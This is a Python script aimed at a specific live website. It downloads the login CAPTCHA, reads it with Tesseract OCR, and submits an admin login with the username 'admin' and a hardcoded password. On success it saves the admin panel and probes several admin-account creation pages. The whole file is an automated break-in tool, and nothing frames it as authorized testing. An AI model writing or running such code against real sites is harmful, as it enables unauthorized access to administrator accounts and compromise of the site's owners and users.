import urllib.request, urllib.parse, io
import http.cookiejar, re
from PIL import Image
import pytesseract

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

for attempt in range(8):
    resp = opener.open('http://bjhzsv.com/main/inc/code.asp', timeout=10)
    cap_data = resp.read()
    
    img = Image.open(io.BytesIO(cap_data))
    img = img.convert('L')
    img = img.point(lambda x: 0 if x < 200 else 255)
    code = pytesseract.image_to_string(img, config='--psm 8 -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz').strip()
    code = code.replace(' ', '').lower()
    if not code:
        code = pytesseract.image_to_string(Image.open(io.BytesIO(cap_data)), config='--psm 8').strip().replace(' ', '').lower()
    
    print(f'Attempt {attempt+1}: Captcha = "{code}"')
    
    if len(code) >= 3:
        login_url = 'http://bjhzsv.com/main/a7chkuser.asp'
        data = urllib.parse.urlencode({'t1': 'admin', 't2': '2d9d5942943a1323', 't3': code}).encode()
        resp = opener.open(login_url, data, timeout=10)
        body = resp.read().decode('gb2312', errors='replace')
        
        if '验证码错误' not in body and 'location.href' in body:
            print('LOGIN SUCCESS! Captcha=' + code)
            # Get admin session
            resp2 = opener.open('http://bjhzsv.com/main/index.asp', timeout=10)
            body2 = resp2.read().decode('gb2312', errors='replace')
            fname = '/tmp/admin_index.html'
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(body2)
            print(f'Admin index: {len(body2)} bytes - saved to {fname}')
            
            # Try admin pages
            for path in ['admin_add.asp', 'user_add.asp', 'manager_add.asp', 'a7admin_add.asp']:
                try:
                    r = opener.open('http://bjhzsv.com/main/' + path, timeout=5)
                    b = r.read().decode('gb2312', errors='replace')
                    print(f'{path}: {len(b)} bytes - redirect={("location.href" in b)}')
                    sfname = '/tmp/' + path.replace('.asp', '')
                    with open(sfname, 'w', encoding='utf-8') as f:
                        f.write(b)
                except Exception as e:
                    print(f'{path}: error {e}')
            
            exit(0)
        else:
            print('Login failed')
    else:
        print('Captcha too short')

print('All attempts failed')
